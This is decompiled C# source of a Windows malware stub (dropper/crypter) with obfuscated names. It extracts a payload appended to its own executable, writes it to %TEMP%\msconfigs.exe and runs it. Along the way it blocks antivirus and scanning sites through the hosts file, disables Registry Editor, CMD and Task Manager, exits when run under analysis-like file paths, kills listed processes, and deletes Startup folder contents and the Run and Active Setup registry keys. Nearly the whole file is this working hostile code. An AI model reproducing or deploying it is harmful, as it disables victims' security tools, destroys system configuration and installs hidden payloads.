using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
public sealed class yKrZ4Gyapk
{
	[STAThread]
	public static void main()
	{
		int try0000_dispatch = -1;
		int num = default(int);
		string[] array = default(string[]);
		int num2 = default(int);
		int num3 = default(int);
		string[] array2 = default(string[]);
		int num5 = default(int);
		int num6 = default(int);
		Process[] processesByName = default(Process[]);
		Process[] array3 = default(Process[]);
		int num7 = default(int);
		Process process = default(Process);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					num = 1;
					array = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "/1337h3ck/", -1, (CompareMethod)0);
					goto IL_001a;
				case 1621:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_001a;
						case 3:
							goto IL_0034;
						case 4:
							goto IL_003c;
						case 5:
							goto IL_0049;
						case 6:
						case 7:
							goto IL_0057;
						case 8:
							goto IL_0064;
						case 9:
						case 10:
							goto IL_0072;
						case 11:
							goto IL_0080;
						case 12:
						case 13:
							goto IL_008f;
						case 14:
							goto IL_009d;
						case 15:
						case 16:
							goto IL_00ac;
						case 17:
							goto IL_00ba;
						case 18:
						case 19:
							goto IL_00c9;
						case 20:
							goto IL_00d7;
						case 21:
						case 22:
							goto IL_00e6;
						case 23:
							goto IL_00f4;
						case 24:
						case 25:
							goto IL_0103;
						case 26:
							goto IL_0112;
						case 27:
						case 28:
							goto IL_0121;
						case 29:
							goto IL_0130;
						case 30:
						case 31:
							goto IL_013f;
						case 32:
							goto IL_014e;
						case 33:
						case 34:
							goto IL_015d;
						case 35:
							goto IL_016c;
						case 36:
						case 37:
							goto IL_017b;
						case 38:
							goto IL_018a;
						case 39:
						case 40:
							goto IL_01ad;
						case 41:
							goto IL_01bc;
						case 42:
						case 43:
							goto IL_01df;
						case 44:
							goto IL_01ee;
						case 45:
						case 46:
							goto IL_0200;
						case 47:
							goto IL_020f;
						case 48:
							goto IL_022e;
						case 49:
						case 50:
						case 51:
							goto IL_0238;
						case 52:
							goto IL_0247;
						case 53:
							goto IL_0266;
						case 54:
						case 55:
						case 56:
							goto IL_0270;
						case 57:
							goto IL_027f;
						case 58:
							goto IL_0290;
						case 59:
						case 60:
						case 61:
							goto IL_02a4;
						case 62:
							goto IL_02b6;
						case 63:
							goto IL_02de;
						case 64:
							goto IL_02f6;
						case 65:
							goto IL_031e;
						case 66:
						case 67:
							goto IL_0336;
						case 68:
							goto IL_0345;
						case 69:
							goto IL_036d;
						case 70:
						case 71:
							goto IL_0385;
						case 72:
							goto IL_039b;
						case 73:
							goto IL_03ac;
						case 74:
							goto IL_03b9;
						case 75:
							goto IL_03cc;
						case 76:
							goto IL_03dd;
						case 77:
						case 78:
							goto IL_03e9;
						case 79:
							goto IL_03f3;
						case 80:
							goto IL_0419;
						case 81:
							goto IL_043d;
						case 82:
						case 83:
							goto IL_045f;
						case 84:
							goto IL_0478;
						case 85:
							goto IL_0496;
						case 86:
							goto IL_04ad;
						case 87:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 88:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0496:
					num = 85;
					FileSystem.FilePut(1, array[1], -1L, false);
					goto IL_04ad;
					IL_001a:
					num = 2;
					array2 = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "/irunxbl/", -1, (CompareMethod)0);
					goto IL_0034;
					IL_0034:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_003c;
					IL_003c:
					num = 4;
					if (Conversions.ToBoolean(array[2]))
					{
						goto IL_0049;
					}
					goto IL_0057;
					IL_0049:
					num = 5;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.virustotal.com");
					goto IL_0057;
					IL_0057:
					num = 7;
					if (Conversions.ToBoolean(array[3]))
					{
						goto IL_0064;
					}
					goto IL_0072;
					IL_0064:
					num = 8;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.google.com");
					goto IL_0072;
					IL_0072:
					num = 10;
					if (Conversions.ToBoolean(array[4]))
					{
						goto IL_0080;
					}
					goto IL_008f;
					IL_0080:
					num = 11;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.novirusthanks.org");
					goto IL_008f;
					IL_008f:
					num = 13;
					if (Conversions.ToBoolean(array[5]))
					{
						goto IL_009d;
					}
					goto IL_00ac;
					IL_009d:
					num = 14;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.kaspersky.com");
					goto IL_00ac;
					IL_00ac:
					num = 16;
					if (Conversions.ToBoolean(array[6]))
					{
						goto IL_00ba;
					}
					goto IL_00c9;
					IL_00ba:
					num = 17;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.malwarebytes.org");
					goto IL_00c9;
					IL_00c9:
					num = 19;
					if (Conversions.ToBoolean(array[7]))
					{
						goto IL_00d7;
					}
					goto IL_00e6;
					IL_00d7:
					num = 20;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.clamav.net");
					goto IL_00e6;
					IL_00e6:
					num = 22;
					if (Conversions.ToBoolean(array[8]))
					{
						goto IL_00f4;
					}
					goto IL_0103;
					IL_00f4:
					num = 23;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.yahoo.com");
					goto IL_0103;
					IL_0103:
					num = 25;
					if (Conversions.ToBoolean(array[9]))
					{
						goto IL_0112;
					}
					goto IL_0121;
					IL_0112:
					num = 26;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.virusscan.jotti.org");
					goto IL_0121;
					IL_0121:
					num = 28;
					if (Conversions.ToBoolean(array[10]))
					{
						goto IL_0130;
					}
					goto IL_013f;
					IL_0130:
					num = 29;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.download.com");
					goto IL_013f;
					IL_013f:
					num = 31;
					if (Conversions.ToBoolean(array[11]))
					{
						goto IL_014e;
					}
					goto IL_015d;
					IL_014e:
					num = 32;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.avg.com");
					goto IL_015d;
					IL_015d:
					num = 34;
					if (Conversions.ToBoolean(array[12]))
					{
						goto IL_016c;
					}
					goto IL_017b;
					IL_016c:
					num = 35;
					yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.eset.com");
					goto IL_017b;
					IL_017b:
					num = 37;
					if (Conversions.ToBoolean(array[13]))
					{
						goto IL_018a;
					}
					goto IL_01ad;
					IL_018a:
					num = 38;
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object)"1", RegistryValueKind.DWord);
					goto IL_01ad;
					IL_01ad:
					num = 40;
					if (Conversions.ToBoolean(array[14]))
					{
						goto IL_01bc;
					}
					goto IL_01df;
					IL_01bc:
					num = 41;
					((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object)"1", RegistryValueKind.DWord);
					goto IL_01df;
					IL_01df:
					num = 43;
					if (Conversions.ToBoolean(array[15]))
					{
						goto IL_01ee;
					}
					goto IL_0200;
					IL_01ee:
					num = 44;
					Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)0, false, -1);
					goto IL_0200;
					IL_0200:
					num = 46;
					if (Conversions.ToBoolean(array[16]))
					{
						goto IL_020f;
					}
					goto IL_0238;
					IL_020f:
					num = 47;
					if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("sample"))
					{
						goto IL_022e;
					}
					goto IL_0238;
					IL_022e:
					num = 48;
					Environment.Exit(0);
					goto IL_0238;
					IL_0238:
					num = 51;
					if (Conversions.ToBoolean(array[17]))
					{
						goto IL_0247;
					}
					goto IL_0270;
					IL_0247:
					num = 52;
					if (Process.GetCurrentProcess().MainModule!.FileName!.Contains("#"))
					{
						goto IL_0266;
					}
					goto IL_0270;
					IL_0266:
					num = 53;
					Environment.Exit(0);
					goto IL_0270;
					IL_0270:
					num = 56;
					if (Conversions.ToBoolean(array[18]))
					{
						goto IL_027f;
					}
					goto IL_02a4;
					IL_027f:
					num = 57;
					if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
					{
						goto IL_0290;
					}
					goto IL_02a4;
					IL_0290:
					num = 58;
					yKrZ4Gyapkaa(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)));
					goto IL_02a4;
					IL_02a4:
					num = 61;
					if (Conversions.ToBoolean(array[20]))
					{
						goto IL_02b6;
					}
					goto IL_0336;
					IL_02b6:
					num = 62;
					((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", writable: true)!.DeleteSubKeyTree("Run");
					goto IL_02de;
					IL_02de:
					num = 63;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().Close();
					goto IL_02f6;
					IL_02f6:
					num = 64;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", writable: true)!.DeleteSubKeyTree("Run");
					goto IL_031e;
					IL_031e:
					num = 65;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().Close();
					goto IL_0336;
					IL_0336:
					num = 67;
					if (Conversions.ToBoolean(array[19]))
					{
						goto IL_0345;
					}
					goto IL_0385;
					IL_0345:
					num = 68;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup", writable: true)!.DeleteSubKeyTree("Installed Components");
					goto IL_036d;
					IL_036d:
					num = 69;
					((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().Close();
					goto IL_0385;
					IL_0385:
					num = 71;
					num5 = Conversions.ToInteger(array[21]);
					num6 = 1;
					goto IL_0396;
					IL_0396:
					if (num6 <= num5)
					{
						goto IL_039b;
					}
					goto IL_03f3;
					IL_039b:
					num = 72;
					if (Process.GetProcessesByName(array2[num6]).Length >= 1)
					{
						goto IL_03ac;
					}
					goto IL_03e9;
					IL_03ac:
					num = 73;
					processesByName = Process.GetProcessesByName(array2[num6]);
					goto IL_03b9;
					IL_03b9:
					num = 74;
					array3 = processesByName;
					num7 = 0;
					goto IL_03e1;
					IL_03e1:
					if (num7 < array3.Length)
					{
						process = array3[num7];
						goto IL_03cc;
					}
					goto IL_03e9;
					IL_04ad:
					num = 86;
					FileSystem.FileClose(new int[1] { 1 });
					break;
					IL_03cc:
					num = 75;
					process.Kill();
					num7 = checked(num7 + 1);
					goto IL_03dd;
					IL_03dd:
					num = 76;
					goto IL_03e1;
					IL_03e9:
					num = 78;
					num6 = checked(num6 + 1);
					goto IL_0396;
					IL_03f3:
					num = 79;
					((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(Path.GetTempPath() + "msconfigs.exe", array[1], true);
					goto IL_0419;
					IL_0419:
					num = 80;
					if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Path.GetTempPath() + "msconfigs.exe"))
					{
						goto IL_043d;
					}
					goto IL_045f;
					IL_043d:
					num = 81;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Path.GetTempPath() + "msconfigs.exe");
					goto IL_045f;
					IL_045f:
					num = 83;
					Process.Start(Path.GetTempPath() + "msconfigs.exe");
					goto IL_0478;
					IL_0478:
					num = 84;
					FileSystem.FileOpen(1, Path.GetTempPath() + "msconfigs.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
					goto IL_0496;
					end_IL_0000_2:
					break;
				}
				num = 87;
				Process.Start(Path.GetTempPath() + "msconfigs.exe");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 1621;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void yKrZ4Gyapkaa(DirectoryInfo dir)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		FileInfo fileInfo = default(FileInfo);
		int num5 = default(int);
		FileInfo[] files = default(FileInfo[]);
		FileInfo[] array = default(FileInfo[]);
		DirectoryInfo[] directories = default(DirectoryInfo[]);
		DirectoryInfo[] array2 = default(DirectoryInfo[]);
		int num6 = default(int);
		DirectoryInfo dir2 = default(DirectoryInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 175:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0012;
						case 4:
							goto IL_0023;
						case 5:
							goto IL_0032;
						case 6:
							goto IL_003d;
						case 7:
							goto IL_0047;
						case 8:
							goto IL_0058;
						case 9:
							goto IL_0067;
						default:
							goto end_IL_0000;
						case 10:
							goto end_IL_0000_2;
						}
						goto default;
					}
					IL_0023:
					num = 4;
					fileInfo.Delete();
					num5 = checked(num5 + 1);
					goto IL_0032;
					IL_0008:
					num = 2;
					files = dir.GetFiles();
					goto IL_0012;
					IL_0012:
					num = 3;
					array = files;
					num5 = 0;
					goto IL_0035;
					IL_0035:
					if (num5 < array.Length)
					{
						fileInfo = array[num5];
						goto IL_0023;
					}
					goto IL_003d;
					IL_003d:
					num = 6;
					directories = dir.GetDirectories();
					goto IL_0047;
					IL_0047:
					num = 7;
					array2 = directories;
					num6 = 0;
					goto IL_006b;
					IL_006b:
					if (num6 < array2.Length)
					{
						dir2 = array2[num6];
						goto IL_0058;
					}
					goto end_IL_0000_2;
					IL_0032:
					num = 5;
					goto IL_0035;
					IL_0058:
					num = 8;
					yKrZ4Gyapkaa(dir2);
					num6 = checked(num6 + 1);
					goto IL_0067;
					IL_0067:
					num = 9;
					goto IL_006b;
					end_IL_0000:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 175;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static object yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk(string yKrZ4Gyapkb)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 104:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_0016;
						case 4:
							goto IL_002a;
						case 5:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_002a:
					num = 4;
					streamWriter.Close();
					break;
					IL_0007:
					num = 2;
					streamWriter = new StreamWriter("C:\\Windows\\System32\\drivers\\etc\\hosts", append: true);
					goto IL_0016;
					IL_0016:
					num = 3;
					streamWriter.Write("\n 127.0.0.1 " + yKrZ4Gyapkb);
					goto IL_002a;
					end_IL_0000_2:
					break;
				}
				num = 5;
				obj = "hi";
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 104;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}
}
